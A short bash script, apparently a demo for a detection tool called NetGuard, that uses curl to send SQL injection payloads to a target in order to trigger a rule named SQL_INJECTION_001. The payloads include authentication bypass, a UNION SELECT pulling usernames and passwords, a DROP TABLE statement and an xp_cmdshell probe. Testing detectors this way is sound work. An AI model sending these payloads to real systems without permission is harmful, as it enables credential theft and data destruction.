#!/bin/bash
# NetGuard Demo — SQL Injection Attack
# Sends HTTP requests with SQL injection payloads to trigger SQL_INJECTION_001
# Usage: ./attack_sql.sh [TARGET_IP] [PORT]
# Requires: curl

TARGET="${1:-127.0.0.1}"
PORT="${2:-80}"
BASE="http://${TARGET}:${PORT}"

echo "[*] Sending SQL injection payloads to $BASE..."

curl -s "${BASE}/login?id=' OR '1'='1" -o /dev/null &
curl -s "${BASE}/search?q=UNION SELECT username,password FROM users--" -o /dev/null &
curl -s "${BASE}/item?id=1; DROP TABLE users--" -o /dev/null &
curl -s -X POST "${BASE}/login" -d "username=admin&password=' OR '1'='1" -o /dev/null &
curl -s "${BASE}/exec?cmd=xp_cmdshell" -o /dev/null &

wait
echo "[+] SQL injection payloads sent."
